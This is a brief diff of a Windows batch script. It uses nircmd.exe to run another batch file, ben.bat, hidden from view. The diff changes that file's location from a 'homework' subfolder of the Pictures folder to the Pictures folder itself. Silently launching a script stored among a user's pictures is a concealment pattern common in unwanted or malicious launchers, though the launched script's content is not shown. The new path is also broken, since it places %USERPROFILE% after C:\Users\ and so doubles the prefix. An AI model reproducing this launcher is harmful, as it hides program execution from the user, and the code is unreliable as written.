@@ -32,5 +32,5 @@
 ::
 ::978f952a14a936cc963da21a135fa983
 @echo off
-nircmd.exe exec hide C:\Users\Admin\Pictures\Camera Roll\pracadomowa\ben.bat
+nircmd.exe exec hide C:\Users\%USERPROFILE%\Pictures\ben.bat
 exit
